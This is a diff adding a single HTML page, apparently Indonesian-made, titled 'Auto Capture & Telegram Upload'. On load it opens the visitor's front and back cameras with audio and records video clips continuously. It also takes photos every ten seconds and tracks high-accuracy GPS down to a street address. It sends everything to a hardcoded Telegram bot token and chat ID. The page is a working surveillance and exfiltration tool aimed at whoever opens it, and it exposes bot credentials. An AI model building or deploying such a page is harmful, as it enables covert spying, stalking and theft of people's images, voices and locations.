@@ -1,0 +1,448 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Auto Capture & Telegram Upload</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #e0f7fa;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      overflow-x: hidden;
+    }
+    #app {
+      max-width: 960px;
+      width: 100%;
+      padding: 1rem;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.5rem;
+      justify-content: center;
+    }
+    .camera-container {
+      flex: 1 1 440px;
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 16px;
+      box-shadow:
+        0 0 15px #00bcd4,
+        inset 0 0 20px #004d40;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 1rem;
+      position: relative;
+    }
+    h2 {
+      font-weight: 700;
+      font-size: 1.5rem;
+      margin-bottom: 0.75rem;
+      text-shadow: 0 0 8px #00bcd4;
+      user-select: none;
+    }
+    video {
+      border-radius: 16px;
+      box-shadow: 0 0 25px #00bcd4;
+      width: 100%;
+      max-width: 440px;
+      aspect-ratio: 4 / 3;
+      object-fit: cover;
+      background: black;
+      border: 2px solid #00bcd4;
+      transition: box-shadow 0.3s ease;
+    }
+    video:focus {
+      outline: none;
+      box-shadow: 0 0 40px #00e5ff;
+    }
+    #errorMsg {
+      color: #ff5252;
+      margin-top: 1rem;
+      text-align: center;
+      max-width: 960px;
+      user-select: none;
+      font-weight: 600;
+      text-shadow: 0 0 5px #ff5252;
+    }
+    #locationInfo {
+      width: 100%;
+      max-width: 960px;
+      margin-top: 1rem;
+      background: rgba(0, 188, 212, 0.15);
+      border-radius: 12px;
+      padding: 1rem 1.5rem;
+      box-shadow: inset 0 0 15px #004d40;
+      font-size: 1rem;
+      line-height: 1.4;
+      color: #b2ebf2;
+      user-select: text;
+      min-height: 80px;
+      white-space: pre-wrap;
+      font-family: 'Courier New', Courier, monospace;
+    }
+    #status {
+      margin-top: 1rem;
+      font-weight: 700;
+      color: #00e676;
+      text-shadow: 0 0 8px #00e676;
+      user-select: none;
+    }
+  </style>
+</head>
+<body>
+  <h1 class="text-4xl font-extrabold mt-6 mb-4 text-center select-none" style="text-shadow: 0 0 12px #00bcd4;">
+    Auto Capture & Telegram Upload
+  </h1>
+  <div id="app" role="main" aria-label="Dual camera streams with location information">
+    <div class="camera-container" aria-label="Front camera section">
+      <h2><i class="fas fa-camera-retro"></i> Front Camera</h2>
+      <video id="frontVideo" autoplay playsinline muted tabindex="0" aria-live="polite" aria-label="Front camera video stream"></video>
+    </div>
+    <div class="camera-container" aria-label="Back camera section">
+      <h2><i class="fas fa-camera"></i> Back Camera</h2>
+      <video id="backVideo" autoplay playsinline muted tabindex="0" aria-live="polite" aria-label="Back camera video stream"></video>
+    </div>
+  </div>
+  <div id="errorMsg" role="alert" aria-live="assertive"></div>
+  <section id="locationInfo" aria-live="polite" aria-atomic="true" tabindex="0" aria-label="Current location information">
+    [INIT] Menginisialisasi informasi lokasi...
+  </section>
+  <div id="status" aria-live="polite" aria-atomic="true">[INIT] Sistem dimulai.</div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/js/all.min.js"></script>
+  <script>
+    const frontVideo = document.getElementById('frontVideo');
+    const backVideo = document.getElementById('backVideo');
+    const errorMsg = document.getElementById('errorMsg');
+    const locationInfo = document.getElementById('locationInfo');
+    const status = document.getElementById('status');
+
+    let frontStream = null;
+    let backStream = null;
+    let frontMediaRecorder = null;
+    let backMediaRecorder = null;
+    let frontVideoChunks = [];
+    let backVideoChunks = [];
+    let currentLocationData = null; // Store location data
+
+    // Telegram Bot Info - REPLACE with your own bot token and chat ID
+    const TELEGRAM_BOT_TOKEN = '7483459278:AAEG2uWSOMbdga4LHGTzpilrcwyUDVI0rPY';
+    const TELEGRAM_CHAT_ID = '6024515768';
+    const VIDEO_RECORD_DURATION = 5000; // 5 seconds in milliseconds
+    const PHOTO_CAPTURE_INTERVAL = 10000; // 10 seconds in milliseconds
+
+    // Function to update status messages with hacker-like prefix
+    function updateStatus(message, type = 'INFO') {
+      const timestamp = new Date().toLocaleTimeString('id-ID', {
+        hour: '2-digit', minute: '2-digit', second: '2-digit'
+      });
+      status.textContent = `[${type.toUpperCase()}] ${timestamp} : ${message}`;
+      console.log(`[${type.toUpperCase()}] ${timestamp} : ${message}`);
+    }
+
+    async function getCameraStream(facingMode) {
+      try {
+        updateStatus(`Meminta akses kamera ${facingMode}...`);
+        return await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: { exact: facingMode },
+            width: { ideal: 640 },
+            height: { ideal: 480 }
+          },
+          audio: true
+        });
+      } catch (e) {
+        updateStatus(`Gagal mendapatkan kamera ${facingMode}: ${e.message}`, 'ERROR');
+        throw e;
+      }
+    }
+
+    async function startFrontCamera() {
+      try {
+        frontStream = await getCameraStream('user');
+        frontVideo.srcObject = frontStream;
+        errorMsg.textContent = '';
+        updateStatus('[SUCCESS] Kamera depan terhubung. Memulai perekaman...');
+        startRecording(frontStream, 'Depan');
+      } catch (e) {
+        errorMsg.textContent = '[ERROR] Kamera depan tidak tersedia atau izin ditolak.';
+        console.error("Front camera error:", e);
+      }
+    }
+
+    async function startBackCamera() {
+      try {
+        backStream = await getCameraStream('environment');
+        backVideo.srcObject = backStream;
+        errorMsg.textContent = '';
+        updateStatus('[SUCCESS] Kamera belakang terhubung. Memulai perekaman...');
+        startRecording(backStream, 'Belakang');
+      } catch (e) {
+        errorMsg.textContent = '[ERROR] Kamera belakang tidak tersedia atau izin ditolak.';
+        console.error("Back camera error:", e);
+      }
+    }
+
+    function startRecording(stream, cameraLabel) {
+      const options = { mimeType: 'video/webm; codecs=vp8' };
+
+      let mediaRecorder;
+      let videoChunks = [];
+
+      if (cameraLabel === 'Depan') {
+        frontMediaRecorder = new MediaRecorder(stream, options);
+        mediaRecorder = frontMediaRecorder;
+        frontVideoChunks = [];
+        videoChunks = frontVideoChunks;
+      } else {
+        backMediaRecorder = new MediaRecorder(stream, options);
+        mediaRecorder = backMediaRecorder;
+        backVideoChunks = [];
+        videoChunks = backVideoChunks;
+      }
+
+      mediaRecorder.ondataavailable = event => {
+        if (event.data.size > 0) {
+          videoChunks.push(event.data);
+        }
+      };
+
+      mediaRecorder.onstop = async () => {
+        const blob = new Blob(videoChunks, { type: 'video/webm' });
+        updateStatus(`[UPLOAD] Mengirim data video: ${cameraLabel} ...`);
+        await sendVideoToTelegram(blob, cameraLabel);
+        // Clear chunks for next recording
+        if (cameraLabel === 'Depan') {
+          frontVideoChunks = [];
+        } else {
+          backVideoChunks = [];
+        }
+        // Restart recording immediately
+        mediaRecorder.start(VIDEO_RECORD_DURATION);
+      };
+
+      mediaRecorder.start(VIDEO_RECORD_DURATION);
+      updateStatus(`[REC] Perekaman dimulai untuk ${cameraLabel} (${VIDEO_RECORD_DURATION / 1000}s/klip)`);
+    }
+
+    // Capture photo from video element and return base64 PNG
+    function capturePhotoBase64(video) {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      return canvas.toDataURL('image/jpeg', 0.8); // Use JPEG for smaller size
+    }
+
+    // Generate detailed caption with a "hacker" vibe
+    function generateCaption(type, cameraLabel) {
+      const timestamp = new Date().toLocaleString('en-US', {
+        year: 'numeric', month: '2-digit', day: '2-digit',
+        hour: '2-digit', minute: '2-digit', second: '2-digit',
+        hour12: false // 24-hour format
+      }).replace(/(\d{2})\/(\d{2})\/(\d{4}), (\d{2}):(\d{2}):(\d{2})/, '$3-$1-$2 $4:$5:$6'); // YYYY-MM-DD HH:MM:SS
+
+      let caption = `📡 **[LOG_ENTRY]** ${type.toUpperCase()} CAPTURE\n`;
+      caption += `\`TYPE\` : \`${type.toUpperCase()}\`\n`; // Make type uppercase
+      caption += `\`CAMERA\` : \`${cameraLabel.toUpperCase()}\`\n`; // Make cameraLabel uppercase
+      caption += `\`TIMESTAMP\` : \`${timestamp}\`\n`;
+
+      if (currentLocationData) {
+        caption += `\n\`GEO_DATA\`:\n`;
+        caption += `\`LATITUDE\` : \`${currentLocationData.latitude.toFixed(6)}\`\n`;
+        caption += `\`LONGITUDE\` : \`${currentLocationData.longitude.toFixed(6)}\`\n`;
+        if (currentLocationData.accuracy !== null) caption += `\`ACCURACY\` : \`±${currentLocationData.accuracy}m\`\n`;
+        if (currentLocationData.altitude !== null) caption += `\`ALTITUDE\` : \`${currentLocationData.altitude.toFixed(2)}m\`\n`;
+        if (currentLocationData.altitudeAccuracy !== null) caption += `\`ALT_ACCURACY\` : \`±${currentLocationData.altitudeAccuracy}m\`\n`;
+        if (currentLocationData.heading !== null) caption += `\`HEADING\` : \`${currentLocationData.heading.toFixed(2)}°\`\n`;
+        if (currentLocationData.speed !== null) caption += `\`SPEED\` : \`${currentLocationData.speed.toFixed(2)}m/s\`\n`;
+
+        if (currentLocationData.address) {
+          const addr = currentLocationData.address;
+          const parts = [
+            addr.road || '',
+            addr.suburb || '',
+            addr.city || addr.town || addr.village || '',
+            addr.state || '',
+            addr.country || ''
+          ].filter(Boolean);
+          caption += `\`ADDRESS\` : \`${parts.join(', ')}\`\n`;
+        }
+      } else {
+        caption += `\n\`GEO_DATA\` : \`STATUS_UNAVAILABLE\` ⚠️\n`;
+      }
+      return caption;
+    }
+
+    // Send photo to Telegram via Bot API
+    async function sendPhotoToTelegram(base64Image, cameraLabel) {
+      try {
+        const blob = await (await fetch(base64Image)).blob();
+        const caption = generateCaption('Foto', cameraLabel);
+
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('caption', caption);
+        formData.append('photo', blob, `${cameraLabel.toLowerCase()}_photo_${Date.now()}.jpeg`); // lowercase filename
+
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+        const data = await response.json();
+        if (!data.ok) {
+          throw new Error(data.description || 'Telegram API error');
+        }
+        updateStatus(`[SUCCESS] Foto ${cameraLabel} dikirim.`);
+        return true;
+      } catch (err) {
+        console.error('Telegram send photo error:', err);
+        updateStatus(`[ERROR] Gagal mengirim foto ${cameraLabel}: ${err.message}`, 'ERROR');
+        return false;
+      }
+    }
+
+    // Send video to Telegram via Bot API
+    async function sendVideoToTelegram(videoBlob, cameraLabel) {
+      try {
+        const caption = generateCaption('Video', cameraLabel);
+
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('caption', caption);
+        formData.append('video', videoBlob, `${cameraLabel.toLowerCase()}_video_${Date.now()}.webm`); // lowercase filename
+
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+          method: 'POST',
+          body: formData
+        });
+
+        const data = await response.json();
+        if (!data.ok) {
+          throw new Error(data.description || 'Telegram API error');
+        }
+        updateStatus(`[SUCCESS] Video ${cameraLabel} dikirim.`);
+        return true;
+      } catch (err) {
+        console.error('Telegram send video error:', err);
+        updateStatus(`[ERROR] Gagal mengirim video ${cameraLabel}: ${err.message}`, 'ERROR');
+        return false;
+      }
+    }
+
+    // Auto capture photos every X seconds and send to Telegram
+    async function autoCaptureAndSendPhoto() {
+      if (!frontVideo.srcObject || !backVideo.srcObject) {
+        updateStatus('[WAIT] Menunggu aliran kamera...', 'WARNING');
+        return;
+      }
+      updateStatus('[PROC] Mengambil snapshot foto...');
+
+      const frontBase64 = capturePhotoBase64(frontVideo);
+      const backBase64 = capturePhotoBase64(backVideo);
+
+      await sendPhotoToTelegram(frontBase64, 'Depan');
+      await sendPhotoToTelegram(backBase64, 'Belakang');
+
+      updateStatus(`[TASK] Siklus pengambilan foto selesai.`);
+    }
+
+    // Location info
+    function displayLocation(position) {
+      const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
+      currentLocationData = { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed };
+
+      let info = `\`LINTANG\` : \`${latitude.toFixed(6)}\`\n`;
+      info += `\`BUJUR\` : \`${longitude.toFixed(6)}\`\n`;
+      info += `\`AKURASI_POSISI\` : \`±${accuracy}m\`\n`;
+      if (altitude !== null) info += `\`KETINGGIAN\` : \`${altitude.toFixed(2)}m\`\n`;
+      if (altitudeAccuracy !== null) info += `\`AKURASI_KETINGGIAN\` : \`±${altitudeAccuracy}m\`\n`;
+      if (heading !== null) info += `\`ARAH\` : \`${heading.toFixed(2)}°\`\n`;
+      if (speed !== null) info += `\`KECEPATAN\` : \`${speed.toFixed(2)}m/s\`\n`;
+
+      fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`)
+        .then(res => res.json())
+        .then(data => {
+          if (data.address) {
+            currentLocationData.address = data.address; // Store full address
+            const addr = data.address;
+            const parts = [
+              addr.road || '',
+              addr.suburb || '',
+              addr.city || addr.town || addr.village || '',
+              addr.state || '',
+              addr.country || ''
+            ].filter(Boolean);
+            info += `\n\`ALAMAT_RESOLVED\` : \`${parts.join(', ')}\``;
+          } else {
+            info += '\n\`ALAMAT_RESOLVED\` : `TIDAK_DITEMUKAN`';
+          }
+          locationInfo.innerHTML = `**[GPS_DATA]**\n${info}`; // Use innerHTML for bold
+          updateStatus('[SUCCESS] Data lokasi diperbarui.');
+        })
+        .catch(() => {
+          locationInfo.innerHTML = `**[GPS_DATA]**\n${info}\n\`ALAMAT_RESOLVED\` : \`GAGAL_FETCH\` 🚨`;
+          updateStatus('[WARNING] Gagal mengambil detail alamat.', 'WARNING');
+        });
+    }
+
+    function locationError(err) {
+      locationInfo.innerHTML = `**[GPS_DATA]**\n\`ERROR_CODE\` : \`${err.code}\`\n\`MESSAGE\` : \`${err.message}\` 🔴`;
+      currentLocationData = null; // Clear location on error
+      updateStatus(`[ERROR] Gagal mendapatkan lokasi: ${err.message}`, 'ERROR');
+    }
+
+    if ('geolocation' in navigator) {
+      navigator.geolocation.watchPosition(displayLocation, locationError, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+      updateStatus('[INIT] Memulai pemantauan lokasi...');
+    } else {
+      locationInfo.innerHTML = '`ERROR` : `GEOLOCATION_NOT_SUPPORTED` ❌';
+      currentLocationData = null;
+      updateStatus('[ERROR] Geolocation tidak didukung browser ini.', 'ERROR');
+    }
+
+    // Start cameras and auto capture loop
+    async function start() {
+      updateStatus('[INIT] Memulai koneksi kamera...');
+      await startFrontCamera();
+      await startBackCamera();
+
+      // Start auto capture photos every X seconds
+      setInterval(autoCaptureAndSendPhoto, PHOTO_CAPTURE_INTERVAL);
+      updateStatus(`[TASK] Siklus pengambilan foto otomatis disetel setiap ${PHOTO_CAPTURE_INTERVAL / 1000} detik.`);
+    }
+
+    start();
+
+    // Stop streams and recorders on unload
+    window.addEventListener('beforeunload', () => {
+      if (frontStream) {
+        frontStream.getTracks().forEach(t => t.stop());
+        updateStatus('[STOP] Kamera depan dimatikan.');
+      }
+      if (backStream) {
+        backStream.getTracks().forEach(t => t.stop());
+        updateStatus('[STOP] Kamera belakang dimatikan.');
+      }
+      if (frontMediaRecorder && frontMediaRecorder.state === 'recording') {
+        frontMediaRecorder.stop();
+        updateStatus('[STOP] Perekaman video depan dihentikan.');
+      }
+      if (backMediaRecorder && backMediaRecorder.state === 'recording') {
+        backMediaRecorder.stop();
+        updateStatus('[STOP] Perekaman video belakang dihentikan.');
+      }
+    });
+  </script>
+</body>
+</html>
